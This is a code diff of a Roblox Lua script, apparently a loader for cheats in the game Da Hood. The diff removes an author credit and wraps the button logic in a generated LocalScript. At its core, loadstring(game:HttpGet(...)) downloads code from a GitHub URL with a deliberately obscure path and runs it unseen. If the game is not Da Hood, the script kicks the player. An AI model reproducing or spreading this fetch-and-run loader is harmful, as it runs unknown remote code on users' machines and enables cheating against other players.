@@ -1,9 +1,4 @@
 
---[[ 
-Made By: D34TH_3V1L
-]]--
-
-
 pcall(function()
 
 
@@ -68,7 +63,10 @@ pcall(function()
 
 	-- Scripts:
 
-checking = TextButton
+	local function BIVR_fake_script() -- TextButton.LocalScript 
+		local script = Instance.new('LocalScript', TextButton)
+
+		local checking = script.Parent
 
 		checking.Text = 'Hi'
 
@@ -94,11 +92,15 @@ checking = TextButton
 			-- Code Here:
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/kaka0221/KSAKJDSAKKSDKJSDAJKL-DASLJK-DASKJLSDALJKSDALKJSDALJK-DASLJK-DSA/main/a%C3%B1sldmk%C3%B1laksmdj%C3%B1aksljd%C3%B1lakjs%C3%B1dkjsa%C3%B1ldkjas%C3%B1lkdj%C3%B1lakjsd%C3%B1lkajdl%C3%B1kajsdlkja%C3%B1slkdjas%C3%B1lkdj%C3%B1laksdj%C3%B1asjkd%C3%B1asjd%C3%B1slakjd%C3%B1alk", true))()
 
-		else
-			checking.Text = 'game not found'
-			wait(2)
-			checking.Text = 'This game is not supported'
-			wait(5)
-			game.Players.LocalPlayer:Kick("This script only works for Da Hood ._.") -- change the text to whatever
-		end	
+	else
+		checking.Text = 'game not found'
+		wait(2)
+		checking.Text = 'This game is not supported'
+		wait(5)
+		game.Players.LocalPlayer:Kick("This script only works for Da Hood ._.") -- change the text to whatever
+	end	
+
+
+end
+coroutine.wrap(BIVR_fake_script)()
 end)
